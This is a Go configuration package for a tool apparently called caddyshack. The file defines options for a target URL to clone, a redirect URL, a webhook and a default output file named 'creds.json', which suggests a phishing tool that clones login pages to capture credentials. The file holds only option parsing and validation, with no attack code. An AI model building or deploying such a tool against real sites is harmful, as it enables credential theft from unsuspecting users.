package config

import (
	"errors"
	"fmt"
	"net/url"
)

const Version = "2.0.0"

// Config holds all runtime configuration for caddyshack.
type Config struct {
	TargetURL   string
	Port        int
	OutputFile  string
	RedirectURL string
	UserAgent   string
	CertFile    string
	KeyFile     string
	EnableTLS   bool
	WebhookURL  string
	Verbose     bool
	InsecureTLS bool
	CloneDir    string
}

// Default returns a Config with sensible defaults.
func Default() *Config {
	return &Config{
		Port:       8080,
		OutputFile: "creds.json",
		UserAgent:  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	}
}

// Validate checks Config fields for correctness and fills in derived defaults.
func (c *Config) Validate() error {
	if c.TargetURL == "" {
		return errors.New("--url is required")
	}
	u, err := url.Parse(c.TargetURL)
	if err != nil || (u.Scheme != "http" && u.Scheme != "https") || u.Host == "" {
		return fmt.Errorf("--url must be a valid http/https URL, got: %q", c.TargetURL)
	}
	if c.Port < 1 || c.Port > 65535 {
		return fmt.Errorf("--port must be between 1 and 65535, got: %d", c.Port)
	}
	if (c.CertFile == "") != (c.KeyFile == "") {
		return errors.New("--cert and --key must be provided together")
	}
	if c.WebhookURL != "" {
		wu, err := url.Parse(c.WebhookURL)
		if err != nil || (wu.Scheme != "http" && wu.Scheme != "https") || wu.Host == "" {
			return fmt.Errorf("--webhook must be a valid http/https URL, got: %q", c.WebhookURL)
		}
	}
	if c.RedirectURL == "" {
		c.RedirectURL = c.TargetURL
	}
	return nil
}
